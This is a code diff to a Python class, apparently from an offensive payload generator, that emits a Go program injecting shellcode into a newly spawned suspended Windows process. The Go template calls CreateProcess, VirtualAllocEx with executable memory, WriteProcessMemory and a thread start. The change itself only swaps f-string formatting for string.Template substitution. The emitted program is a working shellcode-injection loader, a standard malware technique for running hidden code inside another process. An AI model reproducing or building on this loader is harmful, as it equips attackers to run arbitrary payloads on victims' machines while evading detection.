@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -15,8 +17,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return ["golang.org/x/sys/windows"]
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 package main
 
 import (
@@ -43,9 +45,9 @@ func main() {{
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}}
-	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("{self.target}"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("$target"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
     
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.{self.memoryPermission}))
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.$memoryPermission))
     
     _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
     
@@ -55,4 +57,4 @@ func main() {{
 	
     CloseHandle.Call(thread);
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
